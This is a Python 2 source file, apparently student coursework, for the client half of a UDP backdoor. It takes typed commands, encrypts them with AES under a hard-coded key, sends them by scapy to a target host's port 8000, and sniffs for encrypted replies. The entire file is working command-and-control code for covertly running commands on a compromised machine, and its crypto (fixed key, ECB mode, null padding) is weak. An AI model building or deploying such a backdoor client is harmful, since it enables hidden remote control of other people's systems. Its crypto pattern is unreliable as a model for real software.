#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    client.py -   UDP Client for Backdoor
#--
#-- FUNCTIONS:      encrypt(data)
#--                 decrypt(data)
#--                 sendCommand(args, data)
#--                 parse(pkt)
#--                 main()
#--
#-- DATE:           October 19, 2015
#--
#-- DESIGNERS:      Brij Shah
#--
#-- PROGRAMMERS:    Brij Shah
#--
#-- NOTES:
#-- A UDP client built to send and recieve encrypted data from and to a
#-- backdoor(server). Client uses AES encrpytion to encrypt and decrypt the
#-- data.
#-----------------------------------------------------------------------------

import argparse, base64, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Crypto.Cipher import AES

MASTER_KEY = "12345678901234567890123456789012"

#-----------------------------------------------------------------------------
#-- FUNCTION:       encrypt(data)
#--
#-- VARIABLES(S):   data - the data to be encrypted
#--
#-- NOTES:
#-- encrypt takes in the data to be encrypted and returns the encoded data.
#-----------------------------------------------------------------------------
def encrypt(data):
    encryptionKey = AES.new(MASTER_KEY)
    tagString = (str(data) +
                  (AES.block_size -
                   len(str(data)) % AES.block_size) * "\0")
    ciphertext = base64.b64encode(encryptionKey.encrypt(tagString))
    return ciphertext

#-----------------------------------------------------------------------------
#-- FUNCTION:       decrypt(data)
#--
#-- VARIABLES(S):   data - the data to be decrypted
#--
#-- NOTES:
#-- decrypt takes in encoded data and returns the plain text value.
#-----------------------------------------------------------------------------
def decrypt(data):
    decryptionKey = AES.new(MASTER_KEY)
    rawData = decryptionKey.decrypt(base64.b64decode(data))
    plaintext = rawData.rstrip("\0")
    return plaintext

#-----------------------------------------------------------------------------
#-- FUNCTION:       sendCommand(args, data)
#--
#-- VARIABLES(S):   args - command line arguments passed to this method
#--                 data - the data to be sent to backdoor
#--
#-- NOTES:
#-- sendCommand takes the user supplied IP address and command, encrypts
#-- the command and creates a packet to send to the backdoor.
#-----------------------------------------------------------------------------
def sendCommand(args, data):
    ciphertext = encrypt(data)
    pkt = IP(dst=args)/UDP(dport=8000, sport=7999)/Raw(load=ciphertext)
    send(pkt, verbose=0)

#-----------------------------------------------------------------------------
#-- FUNCTION:       parse(pkt)
#--
#-- VARIABLES(S):   pkt - the packets being sniffed
#--
#-- NOTES:
#-- parse is a  callback function for the sniff filter. It parses all of the
#-- packets coming into the machine and parses the ones with the specified
#-- information. It works in conjuction with the sniff filter. Once the sniff
#-- filter picks up packets with specified source and destination ports, it
#-- uses parse to check the payload of the packet and print it to the screen
#-----------------------------------------------------------------------------
def parse(pkt):
    if ARP not in pkt:
        data = pkt['Raw'].load
        plaintext = decrypt(data)
        print plaintext

#-----------------------------------------------------------------------------
#-- FUNCTION:       main()
#--
#-- NOTES:
#-- The pseudomain method
#-----------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description='Backdoor - Client')
    parser.add_argument('-d', '--destination', dest='dest_ip', help='destination IP address', required=True)
    args = parser.parse_args()

    while 1:
        command = raw_input("Enter Command: ")
        sendCommand(args.dest_ip, command)
        sniff(filter="udp and dst port 7999 and src port 8000", prn=parse, count=1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print 'Exiting..'
